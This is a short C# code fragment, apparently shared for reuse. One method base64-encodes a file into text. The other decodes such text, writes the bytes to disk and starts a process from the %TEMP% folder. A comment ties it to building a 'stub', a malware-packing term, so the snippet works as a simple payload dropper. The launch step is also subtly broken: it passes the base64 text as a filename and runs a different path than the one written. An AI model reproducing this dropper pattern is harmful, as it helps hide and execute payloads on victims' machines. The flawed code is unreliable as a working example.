            public static void getbytez(string file, string outp)
        {
            byte[] buffer = File.ReadAllBytes(file);
            string base64Encoded = Convert.ToBase64String(buffer);
            File.WriteAllText(outp+ ".txt", base64Encoded);
            //copy the base64encoded text.
            //Code by CursedGmod. credit me please :D
        }
        public static void extract2idk(string txtfile, string outp, string exten)
        {
            byte[] gu = Convert.FromBase64String(txtfile);
            // use it like this: byte[] gu = Convert.FromBase64String(your base64 converted text that you copied from the txt file);
            // or use File.ReadAllText if you're making a stub builder.
            File.WriteAllBytes(outp + exten, gu);
            Process.Start(Environment.ExpandEnvironmentVariables("%TEMP%") + Path.GetFileName(txtfile));
        }
